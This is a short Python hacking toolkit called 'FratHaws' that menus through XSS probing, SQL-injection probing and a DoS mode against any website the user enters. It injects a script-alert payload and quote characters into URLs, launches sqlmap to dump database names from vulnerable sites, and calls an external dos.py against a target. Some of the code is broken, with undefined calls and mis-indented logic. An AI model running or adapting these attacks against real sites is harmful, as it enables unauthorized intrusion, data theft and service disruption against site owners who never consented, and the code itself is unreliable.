# create python3
# Author skelet0r
#
import urllib.request as urllib2
import re
import sys,os
import random


def XSS():
	os.system('clear')
	print("XSSv scan mode")
	print("Enter complete site")
	site = input("FH>>XSS>> ")
	if "http://" not in site and "https://" not in site:
		site = "http://" + site
	else:
		pass
		
	if "id=" not in site:
		print("[!] site does not have ID parameter!")
	else:
		print("[^] site has ID parameter")
		
	try:
		res = urllib2.urlopen(site)
	except:
		print("[!] CRITICAL: site not working!")
		exit()
		
	try:
		print("[^] Site working")
		scr = ';<script>alert(111111111111111111111);</script>'
		site_xss = site + scr
		res = urllib2.urlopen(site_xss)
		info = res.info()
		print("===info===")
		print(info)
		print("==========")
		text = res.read()
			
		if "111111111111111111111" not in str(text):
			print("[!] SITE MAY NOT HAVE XSS VULN")
			exit()
			
		else:
			print("[+] SITE HAS XSS VULNERABILITY")
			print("[+] PAYLOAD:", site_xss)
			sys.exit(1)
				
	except:
		print("FATAL ERROR :<")
		exit()

def desc():
	print(" || This framework is not to cause harm on any website, if you want to avoid going to jail please keep in mind to use this for educational purposes only and with mutual consent from the owner of a website, if you are going to use this for malicious intent keep in mind i am not responsible for your arrest! Happy Hacking!")

def SQL():
	os.system('clear')
	print("SQLi scan mode")
	print("Enter complete site")
	site = input("FH>>SQL>> ")
	if "http://" not in site and "https://" not in site:
		site = "http://" + site
	else:
		pass
		
		if "id=" not in site:
			print("[!] site does not have ID parameter!")
		else:
			print("[^] site has ID parameter")
		
		try:
			res = urllib2.urlopen(site)
			print("[^] site working")
		except:
			print("[!] CRITICAL: site don't work :((")
		
		try:
			info = res.info()
			print("===info===")
			print(info)
			print("==========")
			
			b_site = site + '\'\"'
			res = urllib.urlopen(b_site)
			text = res.read()
			if "You have an error in your SQL syntax" not in str(text):
				print("[!] Site may not have vulnerables")
			else:
				print("[^] Vulnerable:", site)
				y = input("[^^] (Must have SQLmap to function) Attack? |y/n/q|")
				if y == "Y" or y == "y" or y == "yes" or y == "Yes":
					os.system("python sqlmap.py -u "+site+" --dbs")
				else:
					print("BYE!")
		except:
			print("FATAL ERROR")


def Dos():
	os.system('clear')
	print("DOS attack mode")
	print("(MUST HAVE HPING3 IF USING LEVEL 1 & 2 // LEVEL 3 DOES NOT NEED HPING3)")
	print("Enter complete site")
	site = input("FH>>DOS>> ")
	level = int(input("FH>>DOS>>LVL>>"))
	os.system("python3 dos.py "+site)

def mainmen():
	print("V.0.1")
	print("Author: Skelet0r, Advris")
	print("  FratHaws  ")
	print("============")
	print("XSS,SQL Vulnerability Scanning and DoS tool kit [SSH bruteforce added soon]")
	desc()
	print('\n')
	print("Commands")
	print(" ")
	print("1: XSS")
	print("2: SQL")
	print("3: DOS")
	print("4: Scam site scan")
	print(" ")
	try:
		v = input("FH>> ")
	except:
		print("Bye")
		exit()
		
	if v == "desc":
		info()
	elif int(v) == 1:
		XSS()
	elif int(v) == 2:
		SQL()
	elif int(v) == 3:
		Dos()
	else:
		print("That's not a command silly x) ")
		exit()

mainmen()